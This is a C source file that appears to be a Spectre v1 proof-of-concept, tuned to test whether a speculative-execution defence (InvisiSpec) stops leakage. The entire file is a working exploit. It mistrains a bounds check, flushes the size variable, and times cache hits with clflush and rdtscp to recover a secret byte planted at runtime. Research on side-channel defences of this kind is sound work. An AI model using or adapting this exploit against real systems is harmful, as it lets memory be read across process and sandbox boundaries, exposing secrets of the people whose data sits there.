/* Tuned SPECTRE_V1 runnable gadget — spectre_full-proven leak pattern,
   single planted secret byte. Leaks in InvisiSpec UnsafeBaseline + classic cache. */
#include <stdint.h>
#include <stdio.h>
#include <x86intrin.h>
#define STRIDE 512
#define HIT 80
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t unused2[64];
uint8_t array2[256*STRIDE];
uint8_t SECRET = 0;              /* planted at runtime */
uint8_t temp = 0;
void victim(size_t x){ if(x<array1_size){ temp &= array2[array1[x]*STRIDE]; } }
int recover_byte(size_t mx){
  static int results[256]; int tries,i,j,k,mix,junk=0; size_t tx,x; register uint64_t t1,t2; volatile uint8_t*a;
  for(i=0;i<256;i++)results[i]=0;
  for(tries=999;tries>0;tries--){
    for(i=0;i<256;i++)_mm_clflush(&array2[i*STRIDE]);
    tx=tries%array1_size;
    for(j=29;j>=0;j--){
      _mm_clflush(&array1_size);
      for(volatile int z=0;z<100;z++){}
      x=((j%6)-1)&~0xFFFF; x=(x|(x>>16)); x=tx^(x&(mx^tx));
      victim(x);
    }
    for(i=0;i<256;i++){
      mix=((i*167)+13)&255; a=&array2[mix*STRIDE];
      t1=__rdtscp(&junk); t1=__rdtscp(&junk); junk=*a;
      t2=__rdtscp(&junk)-t1; t2=__rdtscp(&junk)-t1;
      if(t2<=HIT && mix!=array1[tries%array1_size]) results[mix]++;
    }
    j=k=-1;
    for(i=0;i<256;i++){ if(j<0||results[i]>=results[j]){k=j;j=i;} else if(k<0||results[i]>=results[k]){k=i;} }
    if(results[j]>=(2*results[k]+5)||(results[j]==2&&results[k]==0)) break;
  }
  results[0]^=junk; return j;
}
int main(){
  for(int i=0;i<sizeof(array2);i++)array2[i]=1;
  SECRET='S';                                   /* the secret to leak */
  size_t mx=(size_t)((char*)&SECRET-(char*)array1);
  int got=recover_byte(mx);
  printf("recovered=0x%02X actual=0x%02X\n",got,SECRET);
  if(got==SECRET) printf("SUCCESS! Leaked the actual SPECTRE_V1 secret.\n");
  else printf("No SPECTRE_V1 secret leaked or could not detect leakage.\n");
  return 0;
}
